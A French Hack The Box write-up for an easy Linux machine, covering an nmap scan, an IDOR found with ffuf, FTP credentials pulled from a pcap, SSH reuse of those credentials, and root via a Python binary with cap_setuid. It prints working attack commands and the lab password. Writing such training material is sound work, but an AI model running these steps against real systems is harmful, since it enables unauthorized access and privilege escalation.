**Plateforme :** Hack The Box **OS :** Linux **Difficulté :** Facile **Tags :** `#HTB` `#Linux` `#IDOR` `#PCAP` `#FTP` `#Capabilities` `#PrivEsc`

## 1. Reconnaissance (Énumération)

La première étape consiste toujours à cartographier les ports et services ouverts sur la cible.

Bash

```
nmap -Pn -sC -sV 10.129.38.38
```

- `-Pn` : Ignore l'étape du ping (utile si la machine bloque l'ICMP).
    
- `-sC` : Lance les scripts Nmap par défaut.
    
- `-sV` : Tente de déterminer les versions des services.
    

**Résultats de l'énumération :**

- **Port 21** : FTP (vsftpd 3.0.3)
    
- **Port 22** : SSH (OpenSSH 8.2p1)
    
- **Port 80** : HTTP (Gunicorn)
    

> **Outils alternatifs pour le scan :**
> 
> - **RustScan** ou **Masscan** : Beaucoup plus rapides que Nmap pour trouver les ports ouverts initiaux (ensuite, on passe Nmap uniquement sur les ports trouvés).
>     

## 2. Accès Initial & Vulnérabilité Web

### Découverte de l'IDOR (Insecure Direct Object Reference)

En visitant le site web sur le port 80, on arrive sur un tableau de bord permettant de capturer du trafic réseau. L'URL générée après un scan ressemble à : `[http://10.129.38.41/data/3](http://10.129.38.41/data/3)`

En testant manuellement ou en "fuzzant" l'URL, on se rend compte qu'on peut accéder aux captures précédentes générées par d'autres utilisateurs en modifiant simplement le chiffre.

Bash

```
# Utilisation de ffuf pour automatiser la recherche de fichiers de scan valides
seq 1 100 > nombres.txt
ffuf -u "http://10.129.38.41/data/FUZZ" -w nombres.txt -fc 404
```

En visitant l'URL `/data/0`, on accède au tout premier scan effectué sur le serveur et on télécharge le fichier `0.pcap`.

## 3. Analyse du fichier PCAP

Le fichier `0.pcap` contient une capture de trafic réseau. L'objectif est d'y trouver des informations sensibles transmises en clair.

**Méthode rapide en ligne de commande (CLI) :**

Bash

```
strings 0.pcap | grep -i "pass"
```

Cette méthode permet de lire directement le texte en clair dans le fichier de capture. On y découvre une tentative de connexion FTP non chiffrée avec les identifiants suivants :

- **User :** `nathan`
    
- **Password :** `Buck3tH4TF0RM3!`
    

> **Outils alternatifs pour l'analyse PCAP :**
> 
> - **Wireshark :** L'outil graphique de référence. En l'ouvrant, on peut faire un clic droit sur une trame FTP > _Follow TCP Stream_ pour voir toute la conversation en clair.
>     
> - **Tshark :** L'équivalent de Wireshark en ligne de commande.
>     

## 4. Exploitation & User Flag

Puisque nous avons les identifiants de Nathan, nous pouvons accéder à ses fichiers. Les administrateurs réutilisant souvent leurs mots de passe, ces identifiants FTP fonctionnent aussi pour un accès système via SSH.

Bash

```
# Connexion SSH
ssh nathan@10.129.38.41

# Lecture du flag utilisateur
cat /home/nathan/user.txt
```

## 5. Élévation de Privilèges (PrivEsc)

L'objectif est maintenant de passer de l'utilisateur `nathan` à l'utilisateur `root`.

### Recherche de vecteurs

Une technique classique sous Linux consiste à chercher les binaires possédant des **Capabilities** (des permissions spéciales accordées à des exécutables spécifiques).

Bash

```
getcap -r / 2>/dev/null
```

_Résultat pertinent :_ `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`

La capacité `cap_setuid` est critique : elle permet au programme Python de s'exécuter avec les droits d'un autre utilisateur (y compris root) s'il le demande.

> **Outils alternatifs pour la PrivEsc :**
> 
> - **LinPEAS (Linux Privilege Escalation Awesome Script) :** Un script automatisé incontournable. Une fois lancé sur la machine cible, il va surligner en rouge/jaune la vulnérabilité `getcap` parmi des centaines d'autres vérifications.
>     
> - **GTFOBins :** Un site web indispensable (gtfobins.github.io). En y cherchant `python` et en cliquant sur `capabilities`, on trouve exactement la commande à taper pour l'exploit.
>     

### Exploitation (Root Flag)

On demande à Python d'importer le module système, de changer son UID (User ID) pour `0` (qui correspond à root), puis d'ouvrir un shell Bash.

Bash

```
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Le prompt change, nous sommes désormais root !

Bash

```
whoami
# root

cat /root/root.txt
# [Flag Root Validé]
```